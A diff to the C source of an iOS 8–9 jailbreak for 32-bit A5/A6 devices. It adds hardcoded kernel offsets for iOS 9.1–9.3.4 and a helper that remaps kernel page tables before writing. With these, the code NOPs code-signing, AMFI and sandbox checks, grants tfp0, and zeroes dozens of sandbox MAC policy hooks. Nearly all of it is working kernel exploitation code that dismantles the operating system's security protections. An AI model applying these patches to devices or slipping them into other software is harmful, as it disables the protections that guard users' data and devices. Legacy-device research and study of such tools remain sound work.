@@ -25,6 +25,7 @@
 #include "../sock_port_2_legacy/sockpuppet.h"
 #include "jailbreak.h"
 #include "patchfinder.h"
+#include "mac_policy_ops.h"
 
 struct utsname u = { 0 };
 
@@ -115,6 +116,11 @@ void patch_page_table(uint32_t tte_virt, uint32_t tte_phys, uint32_t page) {
         wk32(addr, new_entry);
     }
     usleep(10000);
+}
+
+uint32_t wk32_exec(addr, val) {
+    patch_page_table(tte_virt, tte_phys, (addr & ~0xFFF));
+    return wk32(addr, val);
 }
 
 void dump_kernel(vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
@@ -222,61 +228,53 @@ uint32_t find_kernel_pmap(uintptr_t kernel_base) {
     uint32_t pmap_addr;
 
     if(isA5) {
-        //A5 or A5X
         printf("A5(X) ");
-        if (strstr(u.version, "3248.1.") || strstr(u.version, "3247.1.88")) { //9.0-9.0.2
+        if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
+            printf("9.3-9.3.4\n");
+            pmap_addr = 0x3f6454;
+        } else if (strstr(u.version, "3248.31") || strstr(u.version, "3248.21")) {
+            printf("9.2-9.2.1\n");
+            pmap_addr = 0x3ef444;
+        } else if (strstr(u.version, "3248.10")) {
+            printf("9.1\n");
+            pmap_addr = 0x3f8444;
+        } else if (strstr(u.version, "3248.1.") || strstr(u.version, "3247.1.88")) {
             printf("9.0-9.0.2\n");
             pmap_addr = 0x3f7444;
-        } else if (strstr(u.version, "3247.1.56")) { //9.0b4
-            printf("9.0b4\n");
-            pmap_addr = 0x3f5448;
-        } else if (strstr(u.version, "3247.1.36")) { //9.0b3
-            printf("9.0b3\n");
-            pmap_addr = 0x3f6448;
-        } else if (strstr(u.version, "3247.1.6")) { //9.0b2
-            printf("9.0b2\n");
-            pmap_addr = 0x3fb45c;
-        } else if (strstr(u.version, "3216")) { //9.0b1
-            printf("9.0b1\n");
-            pmap_addr = 0x3f8454;
-        } else if (strstr(u.version, "2784")) { //8.3-8.4.1
+        } else if (strstr(u.version, "2784")) {
             printf("8.3-8.4.1\n");
             pmap_addr = 0x3a211c;
-        } else if (strstr(u.version, "2783.5")) { //8.2
+        } else if (strstr(u.version, "2783.5")) {
             printf("8.2\n");
             pmap_addr = 0x39411c;
-        } else if (strstr(u.version, "2783.3.26")) { //8.1.3
+        } else if (strstr(u.version, "2783.3.26")) {
             printf("8.1.3\n");
             pmap_addr = 0x39211c;
-        } else { //8.0-8.1.2
+        } else {
             printf("8.0-8.1.2\n");
             pmap_addr = 0x39111c;
         }
     } else {
-        //A6 or A6X
         printf("A6(X) ");
-        if (strstr(u.version, "3248.1.") || strstr(u.version, "3247.1.88")) { //9.0-9.0.2
+        if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
+            printf("9.3-9.3.4\n");
+            pmap_addr = 0x3fe454;
+        } else if (strstr(u.version, "3248.31") || strstr(u.version, "3248.21")) {
+            printf("9.2-9.2.1\n");
+            pmap_addr = 0x3f6444;
+        } else if (strstr(u.version, "3248.10")) {
+            printf("9.1\n");
+            pmap_addr = 0x3ff444;
+        } else if (strstr(u.version, "3248.1.") || strstr(u.version, "3247.1.88")) {
             printf("9.0-9.0.2\n");
             pmap_addr = 0x3fd444;
-        } else if (strstr(u.version, "3247.1.56")) { //9.0b4
-            printf("9.0b4\n");
-            pmap_addr = 0x3fc448;
-        } else if (strstr(u.version, "3247.1.36")) { //9.0b3
-            printf("9.0b3\n");
-            pmap_addr = 0x3fe448;
-        } else if (strstr(u.version, "3247.1.6")) { //9.0b2
-            printf("9.0b2\n");
-            pmap_addr = 0x40345c;
-        } else if (strstr(u.version, "3216")) { //9.0b1
-            printf("9.0b1\n");
-            pmap_addr = 0x3ff454;
-        } else if (strstr(u.version, "2784")) { //8.3-8.4.1
+        } else if (strstr(u.version, "2784")) {
             printf("8.3-8.4.1\n");
             pmap_addr = 0x3a711c;
-        } else if (strstr(u.version, "2783.5")) { //8.2
+        } else if (strstr(u.version, "2783.5")) {
             printf("8.2\n");
             pmap_addr = 0x39a11c;
-        } else { //8.0-8.1.3
+        } else {
             printf("8.0-8.1.3\n");
             pmap_addr = 0x39711c;
         }
@@ -285,24 +283,27 @@ uint32_t find_kernel_pmap(uintptr_t kernel_base) {
     return pmap_addr + kernel_base;
 }
 
-// debugger 1 and 2 for a5(x) 9.0.x
+// debugger 1 and 2 for a5(x) 9.x
 uint32_t find_PE_i_can_has_debugger_1(void) {
     uint32_t PE_i_can_has_debugger_1;
-    if (strstr(u.version, "3247.1.88")) { //9.0b5
-        printf("9.0b5\n");
-        PE_i_can_has_debugger_1 = 0x3a8f44;
-    } else if (strstr(u.version, "3247.1.56")) { //9.0b4
-        printf("9.0b4\n");
-        PE_i_can_has_debugger_1 = 0x3a7394;
-    } else if (strstr(u.version, "3247.1.36")) { //9.0b3
-        printf("9.0b3\n");
-        PE_i_can_has_debugger_1 = 0x3a8444;
-    } else if (strstr(u.version, "3247.1.6")) { //9.0b2
-        printf("9.0b2\n");
-        PE_i_can_has_debugger_1 = 0x3ad524;
-    } else if (strstr(u.version, "3216")) { //9.0b1
-        printf("9.0b1\n");
-        PE_i_can_has_debugger_1 = 0x45ad20;
+    if (strstr(u.version, "3248.60")) {
+        printf("9.3.3-9.3.4\n");
+        PE_i_can_has_debugger_1 = 0x3a82d4;
+    } else if (strstr(u.version, "3248.50")) {
+        printf("9.3.2\n");
+        PE_i_can_has_debugger_1 = 0x3a7ff4;
+    } else if (strstr(u.version, "3248.41")) {
+        printf("9.3-9.3.1\n");
+        PE_i_can_has_debugger_1 = 0x3a7ea4;
+    } else if (strstr(u.version, "3248.31")) {
+        printf("9.2.1\n");
+        PE_i_can_has_debugger_1 = 0x3a1434;
+    } else if (strstr(u.version, "3248.21")) {
+        printf("9.2\n");
+        PE_i_can_has_debugger_1 = 0x3a12c4;
+    } else if (strstr(u.version, "3248.10")) {
+        printf("9.1\n");
+        PE_i_can_has_debugger_1 = 0x3aa734;
     } else {
         printf("9.0-9.0.2\n");
         PE_i_can_has_debugger_1 = 0x3a8fc4;
@@ -312,21 +313,18 @@ uint32_t find_PE_i_can_has_debugger_1(void) {
 
 uint32_t find_PE_i_can_has_debugger_2(void) {
     uint32_t PE_i_can_has_debugger_2;
-    if (strstr(u.version, "3247.1.56")) { //9.0b4
-        printf("9.0b4\n");
-        PE_i_can_has_debugger_2 = 0x3ae364;
-    } else if (strstr(u.version, "3247.1.36")) { //9.0b3
-        printf("9.0b3\n");
-        PE_i_can_has_debugger_2 = 0x3b01a4;
-    } else if (strstr(u.version, "3247.1.6")) { //9.0b2
-        printf("9.0b2\n");
-        PE_i_can_has_debugger_2 = 0x3b4b94;
-    } else if (strstr(u.version, "3216")) { //9.0b1
-        printf("9.0b1\n");
-        PE_i_can_has_debugger_2 = 0x461e40;
+    if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
+        printf("9.3.x\n");
+        PE_i_can_has_debugger_2 = 0x456070;
+    } else if (strstr(u.version, "3248.31") || strstr(u.version, "3248.21")) {
+        printf("9.2-9.2.1\n");
+        PE_i_can_has_debugger_2 = 0x44f070;
+    } else if (strstr(u.version, "3248.10")) {
+        printf("9.1\n");
+        PE_i_can_has_debugger_2 = 0x457860;
     } else {
         printf("9.0-9.0.2\n");
-        PE_i_can_has_debugger_2 = 0x3af014;
+        PE_i_can_has_debugger_2 = 0x4567d0;
     }
     return PE_i_can_has_debugger_2;
 }
@@ -349,7 +347,7 @@ void unjail8(uint32_t kbase){
     uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch_84(kbase, kdata, ksize);
     uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
     uint32_t vm_map_protect = kbase + find_vm_map_protect_patch_84(kbase, kdata, ksize);
-    uint32_t mount_patch = kbase + find_mount(kbase, kdata, ksize) + 1;
+    uint32_t mount_patch = kbase + find_mount_84(kbase, kdata, ksize) + 1;
     uint32_t mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
     uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
     uint32_t sb_patch = kbase + find_sb_patch(kbase, kdata, ksize);
@@ -407,18 +405,15 @@ void unjail8(uint32_t kbase){
     
     /* vm_fault_enter */
     printf("[*] vm_fault_enter\n");
-    patch_page_table(tte_virt, tte_phys, (vm_fault_enter & ~0xFFF));
-    wk32(vm_fault_enter, 0x2201bf00);
+    wk32_exec(vm_fault_enter, 0x2201bf00);
 
     /* vm_map_enter */
     printf("[*] vm_map_enter\n");
-    patch_page_table(tte_virt, tte_phys, (vm_map_enter & ~0xFFF));
-    wk32(vm_map_enter, 0x4280bf00);
+    wk32_exec(vm_map_enter, 0x4280bf00);
     
     /* vm_map_protect: set NOP */
     printf("[*] vm_map_protect\n");
-    patch_page_table(tte_virt, tte_phys, (vm_map_protect & ~0xFFF));
-    wk32(vm_map_protect, 0xbf00bf00);
+    wk32_exec(vm_map_protect, 0xbf00bf00);
     
     /* mount patch */
     printf("[*] mount patch\n");
@@ -427,21 +422,18 @@ void unjail8(uint32_t kbase){
     
     /* mapForIO: prevent kIOReturnLockedWrite error */
     printf("[*] mapForIO\n");
-    patch_page_table(tte_virt, tte_phys, (mapForIO & ~0xFFF));
-    wk32(mapForIO, 0xbf00bf00);
+    wk32_exec(mapForIO, 0xbf00bf00);
     
     /* csops */
     printf("[*] csops\n");
-    patch_page_table(tte_virt, tte_phys, (csops_addr & ~0xFFF));
-    wk32(csops_addr, 0xbf00bf00);
+    wk32_exec(csops_addr, 0xbf00bf00);
     
     patch_page_table(tte_virt, tte_phys, (csops2_addr & ~0xFFF));
     wk8(csops2_addr, 0x20);
     
     /* sandbox */
     printf("[*] sandbox\n");
-    patch_page_table(tte_virt, tte_phys, (sandbox_call_i_can_has_debugger & ~0xFFF));
-    wk32(sandbox_call_i_can_has_debugger, 0xbf00bf00);
+    wk32_exec(sandbox_call_i_can_has_debugger, 0xbf00bf00);
     
     /* sb_evaluate */
     unsigned char taig32_payload[] = {
@@ -499,14 +491,12 @@ void unjail8(uint32_t kbase){
     
     printf("[*] sb_evaluate_hook\n");
     uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
-    patch_page_table(tte_virt, tte_phys, (sb_patch & ~0xFFF));
-    wk32(sb_patch, sb_evaluate_hook);
+    wk32_exec(sb_patch, sb_evaluate_hook);
 
     printf("[*] patch tfp0\n");
     uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
     printf("[PF] tfp0_patch: %08x\n", tfp0_patch);
-    patch_page_table(tte_virt, tte_phys, (tfp0_patch & ~0xFFF));
-    wk32(tfp0_patch, 0xbf00bf00);
+    wk32_exec(tfp0_patch, 0xbf00bf00);
     
     printf("enable patched.\n");
 }
@@ -515,7 +505,7 @@ void unjail9(uint32_t kbase){
     printf("[*] jailbreaking...\n");
     
     printf("[*] running kdumper\n");
-    size_t ksize = 0xF00000;
+    size_t ksize = 0xFFE000;
     void *kdata = malloc(ksize);
     dump_kernel(kbase, kdata, ksize);
      
@@ -527,8 +517,6 @@ void unjail9(uint32_t kbase){
     uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch(kbase, kdata, ksize);
     uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
     uint32_t vm_map_protect = kbase + find_vm_map_protect_patch(kbase, kdata, ksize);
-    uint32_t mount_patch = kbase + find_mount_90(kbase, kdata, ksize) + 1;
-    uint32_t mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
     uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
     uint32_t sb_patch = kbase + find_sb_evaluate_90(kbase, kdata, ksize);
     uint32_t memcmp_addr = find_memcmp(kbase, kdata, ksize);
@@ -538,6 +526,10 @@ void unjail9(uint32_t kbase){
     uint32_t kernel_pmap = find_kernel_pmap(kbase);
     uint32_t PE_i_can_has_debugger_1;
     uint32_t PE_i_can_has_debugger_2;
+    uint32_t mount_patch;
+    uint32_t mapForIO;
+    uint32_t i_can_has_kernel_configuration_got;
+    uint32_t lwvm_jump;
 
     if (isA5) {
         PE_i_can_has_debugger_1 = kbase + find_PE_i_can_has_debugger_1();
@@ -545,6 +537,22 @@ void unjail9(uint32_t kbase){
     } else {
         PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1_90(kbase, kdata, ksize);
         PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2_90(kbase, kdata, ksize);
+    }
+
+    if (strstr(u.version, "3248.1.")) {
+        mount_patch = kbase + find_mount_90(kbase, kdata, ksize);
+    } else {
+        mount_patch = kbase + find_mount(kbase, kdata, ksize);
+    }
+
+    if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
+        i_can_has_kernel_configuration_got = kbase + find_PE_i_can_has_kernel_configuration_got(kbase, kdata, ksize);
+        lwvm_jump = kbase + find_lwvm_jump(kbase, kdata, ksize);
+        printf("[PF] i_can_has_kernel_configuration_got: %08x\n", i_can_has_kernel_configuration_got);
+        printf("[PF] lwvm_jump:                  %08x\n", lwvm_jump);
+    } else {
+        mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
+        printf("[PF] mapForIO:                   %08x\n", mapForIO);
     }
 
     printf("[PF] proc_enforce:               %08x\n", proc_enforce);
@@ -556,7 +564,6 @@ void unjail9(uint32_t kbase){
     printf("[PF] vm_map_enter:               %08x\n", vm_map_enter);
     printf("[PF] vm_map_protect:             %08x\n", vm_map_protect);
     printf("[PF] mount_patch:                %08x\n", mount_patch);
-    printf("[PF] mapForIO:                   %08x\n", mapForIO);
     printf("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
     printf("[PF] sb_evaluate:                %08x\n", sb_patch);
     printf("[PF] memcmp:                     %08x\n", memcmp_addr);
@@ -589,10 +596,8 @@ void unjail9(uint32_t kbase){
     
     /* debug_enabled -> 1 */
     printf("[*] debug_enabled\n");
-    patch_page_table(tte_virt, tte_phys, (PE_i_can_has_debugger_1 & ~0xFFF));
-    wk32(PE_i_can_has_debugger_1, 1);
-    patch_page_table(tte_virt, tte_phys, (PE_i_can_has_debugger_2 & ~0xFFF));
-    wk32(PE_i_can_has_debugger_2, 1);
+    wk32_exec(PE_i_can_has_debugger_1, 1);
+    wk32_exec(PE_i_can_has_debugger_2, 1);
     
     /* vm_fault_enter */
     printf("[*] vm_fault_enter\n");
@@ -601,38 +606,40 @@ void unjail9(uint32_t kbase){
     
     /* vm_map_enter */
     printf("[*] vm_map_enter\n");
-    patch_page_table(tte_virt, tte_phys, (vm_map_enter & ~0xFFF));
-    wk32(vm_map_enter, 0xbf00bf00);
+    wk32_exec(vm_map_enter, 0xbf00bf00);
     
     /* vm_map_protect: set NOP */
     printf("[*] vm_map_protect\n");
-    patch_page_table(tte_virt, tte_phys, (vm_map_protect & ~0xFFF));
-    wk32(vm_map_protect, 0xbf00bf00);
+    wk32_exec(vm_map_protect, 0xbf00bf00);
     
     /* mount patch */
     printf("[*] mount patch\n");
     patch_page_table(tte_virt, tte_phys, (mount_patch & ~0xFFF));
-    wk8(mount_patch, 0xe7);
+    if (strstr(u.version, "3248.1.")) {
+        wk8(mount_patch, 0xe7);
+    } else {
+        wk8(mount_patch, 0xe0);
+    }
     
     /* mapForIO: prevent kIOReturnLockedWrite error */
     printf("[*] mapForIO\n");
-    patch_page_table(tte_virt, tte_phys, (mapForIO & ~0xFFF));
-    wk32(mapForIO, 0xbf00bf00);
+    if (strstr(u.version, "3248.6") || strstr(u.version, "3248.5") || strstr(u.version, "3248.4")) {
+        wk32_exec(i_can_has_kernel_configuration_got, lwvm_jump);
+    } else {
+        wk32_exec(mapForIO, 0xbf00bf00);
+    }
     
     /* csops */
     printf("[*] csops\n");
-    patch_page_table(tte_virt, tte_phys, (csops_addr & ~0xFFF));
-    wk32(csops_addr, 0xbf00bf00);
+    wk32_exec(csops_addr, 0xbf00bf00);
     
     /* amfi_file_check_mmap */
     printf("[*] amfi_file_check_mmap\n");
-    patch_page_table(tte_virt, tte_phys, (amfi_file_check_mmap & ~0xFFF));
-    wk32(amfi_file_check_mmap, 0xbf00bf00);
+    wk32_exec(amfi_file_check_mmap, 0xbf00bf00);
     
     /* sandbox */
     printf("[*] sandbox\n");
-    patch_page_table(tte_virt, tte_phys, (sandbox_call_i_can_has_debugger & ~0xFFF));
-    wk32(sandbox_call_i_can_has_debugger, 0xbf00bf00);
+    wk32_exec(sandbox_call_i_can_has_debugger, 0xbf00bf00);
     
     /* sb_evaluate */
     unsigned char pangu9_payload[] = {
@@ -683,15 +690,50 @@ void unjail9(uint32_t kbase){
     void* sandbox_payload = malloc(payload_len);
     memcpy(sandbox_payload, pangu9_payload, payload_len);
     
-    // hook sb_evaluate
-    printf("[*] sb_evaluate\n");
-    patch_page_table(tte_virt, tte_phys, ((kbase + payload_base) & ~0xFFF));
-    copyout((kbase + payload_base), sandbox_payload, payload_len);
-    
-    printf("[*] sb_evaluate_hook\n");
-    uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
-    patch_page_table(tte_virt, tte_phys, (sb_patch & ~0xFFF));
-    wk32(sb_patch, sb_evaluate_hook);
+    if (strstr(u.version, "3248.1")) { // 9.0-9.1
+        // hook sb_evaluate
+        printf("[*] sb_evaluate\n");
+        patch_page_table(tte_virt, tte_phys, ((kbase + payload_base) & ~0xFFF));
+        copyout((kbase + payload_base), sandbox_payload, payload_len);
+        printf("[*] sb_evaluate_hook\n");
+        uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
+        wk32_exec(sb_patch, sb_evaluate_hook);
+    } else { // 9.2-9.3.4
+        uint32_t sbopsoffset = kbase + find_sbops(kbase, kdata, ksize);
+        printf("nuking sandbox\n");
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
+        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
+    }
 
     printf("[*] patch tfp0\n");
     uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
@@ -706,7 +748,7 @@ void jailbreak_init(void) {
     uname(&u);
     printf("kern.version: %s\n", u.version);
 
-    if (strstr(u.version, "3248.1.") || strstr(u.version, "3247") || strstr(u.version, "3216")) {
+    if (strstr(u.version, "3248") || strstr(u.version, "3247")) {
         printf("isIOS9? yes\n");
         isIOS9 = true;
     }
@@ -775,7 +817,7 @@ int main(void){
     
     if(tfp0){
         printf("[*] got tfp0: %x\n", tfp0);
-        
+
         if(!isIOS9){
             unjail8(kernel_base);
         } else {
